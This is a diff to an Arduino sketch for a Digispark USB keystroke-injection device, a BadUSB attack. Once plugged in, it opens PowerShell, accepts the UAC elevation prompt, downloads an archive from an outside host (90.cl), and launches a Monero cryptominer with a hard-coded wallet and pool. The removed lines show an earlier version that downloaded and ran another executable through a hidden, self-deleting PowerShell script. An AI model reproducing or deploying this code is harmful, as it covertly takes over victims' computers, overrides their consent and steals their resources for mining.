@@ -2,7 +2,7 @@
 #include "DigiKeyboard.h"
 
 int LED_PIN = 1;
-int KEY_DELAY = 1000;
+int KEY_DELAY = 2500;
 
 void setup() {
   pinMode(LED_PIN, OUTPUT);
@@ -12,34 +12,19 @@ void loop() {
   digitalWrite(LED_PIN, HIGH);
   
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(KEY_DELAY);
   
   // Ejecutar CMD
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(KEY_DELAY);
-  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("powershell Start-Process notepad -Verb runAs");
+  DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(KEY_DELAY);
-  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(KEY_DELAY);
+  DigiKeyboard.print("$errorActionPreference='Stop'; (New-Object Net.Webclient).DownloadFile('https://90.cl/m.zip','m.zip');");
+  DigiKeyboard.print("Expand-Archive -Force m.zip m; ");
+  DigiKeyboard.print("Start-Process -FilePath 'm\\minerd.exe' -ArgumentList '-a cryptonight -u 458pdQ1HHaVeqx8kY9KktsTiwaeHgN1az6eJ96fadvHw3jwbK3cevM7egz4NctbVUmCKWF1HnqRwJfzqDbeqT8ev7PMTiAJ -p demonio -o stratum+tcp://pool.supportxmr.com:3333'; exit;");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(KEY_DELAY);
-  DigiKeyboard.print("(New-Object Net.Webclient).DownloadFile(\"https://90.cl/chauchera.exe\",\"C:\\chauchera.exe\"); Start-Process -FilePath \"C:\\chauchera.exe\"");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("Remove-Item $MyINvocation.InvocationName");
-  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, KEY_S);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("C:\\config-67060.ps1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_F4);
-  DigiKeyboard.delay(KEY_DELAY);
-  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
-  DigiKeyboard.delay(KEY_DELAY);
-  DigiKeyboard.print("powershell -windowstyle hidden -File C:\\config-67060.ps1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  
   digitalWrite(LED_PIN, LOW);
 
   for(;;){ }
